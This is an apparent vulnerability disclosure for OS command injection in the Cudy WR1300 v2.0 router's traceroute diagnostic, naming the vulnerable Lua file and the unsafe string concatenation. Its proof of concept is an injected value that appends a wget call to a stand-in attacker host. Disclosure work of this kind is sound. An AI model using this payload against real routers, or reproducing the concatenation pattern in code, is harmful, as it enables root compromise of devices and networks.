# Cudy WR1300 v2.0 - Remote Code Execution (RCE) via OS Command Injection
---

## Description:
An OS Command Injection vulnerability exists in the Cudy WR1300 v2.0 router with firmware version 2.4.4. The vulnerability is located in the diagnostic tools web interface, specifically within the `traceroute` functionality. An authenticated attacker can inject arbitrary shell commands via the `host` parameter, leading to full system compromise.

## Vulnerability Type:
OS Command Injection (CWE-78)

## Affected Component:
/usr/lib/lua/luci/model/cbi/tools/ping.lua

The vulnerability is caused by unsafe handling of user input, which is directly concatenated into system commands using:
```bash
luci.util.exec("traceroute -c 4 -W 1 " .. user_input)
```
## Impact:
Successful exploitation allows an attacker to execute arbitrary commands on the underlying operating system with root privileges. This can lead to complete control over the router, data theft, and persistence within the network.

## Proof of Concept (PoC):

The vulnerability is caused by unsafe handling of user input, which is directly concatenated into system commands using:

   ```bash
   traceroute 127.0.0.1; wget http://ATTACKER_IP:7777/poc
```
![POC1](https://github.com/user-attachments/assets/09db1ce4-419c-46d4-a336-163b847e57a7)
![POC2](https://github.com/user-attachments/assets/989cd9bb-8912-48cb-be7b-3740eed0d6df)
![POC3](https://github.com/user-attachments/assets/20f7e08f-9e0c-42d5-87ab-8af3a7f10b7e)
